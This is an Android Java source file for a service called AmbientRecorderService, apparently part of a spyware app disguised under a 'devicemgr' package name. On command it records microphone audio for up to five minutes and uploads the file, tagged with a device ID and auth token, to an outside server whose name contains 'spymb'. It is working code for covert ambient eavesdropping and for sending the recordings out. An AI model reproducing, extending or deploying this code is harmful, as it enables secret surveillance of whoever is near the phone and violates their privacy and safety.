package com.company.devicemgr.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import com.company.devicemgr.utils.HttpClient;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * Serviço que grava áudio ambiente durante um período e envia para o backend.
 */
public class AmbientRecorderService extends Service {
        public static final String EXTRA_DURATION_MS = "durationMs";
        public static final String ACTION_STOP = "com.company.devicemgr.AMBIENT_STOP";

        private static final String TAG = "AmbientRecorder";
        private static final String CHANNEL_ID = "ambient_recorder";
        private static final int NOTIF_ID = 3011;
        private static final long MIN_DURATION_MS = 10_000L;
        private static final long MAX_DURATION_MS = 5 * 60_000L;

        private final Handler handler = new Handler(Looper.getMainLooper());
        private MediaRecorder recorder;
        private File currentFile;
        private final Runnable stopRunnable = this::stopAndUpload;

        @Override
        public void onCreate() {
                super.onCreate();
                ensureChannel();
        }

        private void ensureChannel() {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Escuta ambiente", NotificationManager.IMPORTANCE_LOW);
                        NotificationManager nm = getSystemService(NotificationManager.class);
                        if (nm != null) nm.createNotificationChannel(channel);
                }
        }

        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
                if (intent != null && ACTION_STOP.equals(intent.getAction())) {
                        stopAndUpload();
                        stopSelf();
                        return START_NOT_STICKY;
                }

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                                Log.w(TAG, "missing RECORD_AUDIO permission");
                                stopSelf();
                                return START_NOT_STICKY;
                        }
                }

                Notification n = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Gravando ambiente")
                .setContentText("A captar áudio ambiente...")
                .setSmallIcon(android.R.drawable.ic_btn_speak_now)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build();
                startForeground(NOTIF_ID, n);

                long duration = intent != null ? intent.getLongExtra(EXTRA_DURATION_MS, 60_000L) : 60_000L;
                duration = Math.max(MIN_DURATION_MS, Math.min(MAX_DURATION_MS, duration));
                startRecording(duration);
                return START_STICKY;
        }

        private synchronized void startRecording(long durationMs) {
                if (recorder != null) {
                        Log.i(TAG, "already recording");
                        handler.removeCallbacks(stopRunnable);
                        handler.postDelayed(stopRunnable, durationMs);
                        return;
                }
                try {
                        File dir = getExternalFilesDir("ambient");
                        if (dir == null) dir = getFilesDir();
                        if (dir != null && !dir.exists()) dir.mkdirs();

                        String ts = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
                        currentFile = new File(dir, "ambient_" + ts + ".m4a");

                        recorder = new MediaRecorder();
                        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                        recorder.setAudioEncodingBitRate(64000);
                        recorder.setAudioSamplingRate(16000);
                        recorder.setAudioChannels(1);
                        recorder.setOutputFile(currentFile.getAbsolutePath());
                        recorder.prepare();
                        recorder.start();

                        handler.postDelayed(stopRunnable, durationMs);
                        Log.i(TAG, "ambient recording started: " + currentFile.getAbsolutePath());
                        } catch (Exception e) {
                        Log.e(TAG, "start ambient err", e);
                        cleanup();
                        stopSelf();
                }
        }

        private synchronized void stopAndUpload() {
                handler.removeCallbacks(stopRunnable);
                File fileToUpload = currentFile;
                try {
                        if (recorder != null) {
                                try { recorder.stop(); } catch (Exception e) { Log.w(TAG, "stop warning", e); }
                        }
                        } catch (Exception e) {
                        Log.e(TAG, "stopAndUpload err", e);
                        } finally {
                        cleanup();
                }
                if (fileToUpload == null || !fileToUpload.exists()) {
                        Log.w(TAG, "no ambient file to upload");
                        return;
                }

                new Thread(() -> uploadAmbient(fileToUpload)).start();
        }

        private void uploadAmbient(File fileToUpload) {
                boolean uploaded = false;
                try {
                        SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
                        String deviceId = sp.getString("deviceId", "unknown");
                        String token = sp.getString("auth_token", null);
                        String resp = HttpClient.uploadFile("https://spymb.onrender.com/api/media/" + deviceId + "/upload", "media", fileToUpload, token);
                        Log.i(TAG, "ambient upload resp=" + resp);
                        uploaded = true;
                        } catch (Exception e) {
                        Log.e(TAG, "ambient upload err", e);
                }

                if (uploaded) {
                        try {
                                File done = new File(fileToUpload.getParentFile(), "uploaded_" + fileToUpload.getName());
                                boolean ok = fileToUpload.renameTo(done);
                                Log.i(TAG, "ambient file moved=" + ok + " -> " + done.getAbsolutePath());
                                } catch (Exception e) {
                                Log.w(TAG, "rename ambient uploaded err", e);
                        }
                        } else {
                        try {
                                File failedDir = new File(fileToUpload.getParentFile(), "failed");
                                if (!failedDir.exists()) failedDir.mkdirs();
                                File dest = new File(failedDir, "failed_" + fileToUpload.getName());
                                boolean ok = fileToUpload.renameTo(dest);
                                Log.i(TAG, "ambient file failed, moved=" + ok + " -> " + dest.getAbsolutePath());
                                } catch (Exception e) {
                                Log.e(TAG, "move ambient failed err", e);
                        }
                }

                stopSelf();
        }

        private synchronized void cleanup() {
                try {
                        if (recorder != null) {
                                try { recorder.reset(); } catch (Exception ignored) {}
                                try { recorder.release(); } catch (Exception ignored) {}
                        }
                        } finally {
                        recorder = null;
                        currentFile = null;
                }
        }

        @Override
        public void onDestroy() {
                handler.removeCallbacks(stopRunnable);
                cleanup();
                try { stopForeground(true); } catch (Exception ignore) {}
                super.onDestroy();
        }

        @Override
        public IBinder onBind(Intent intent) { return null; }
}
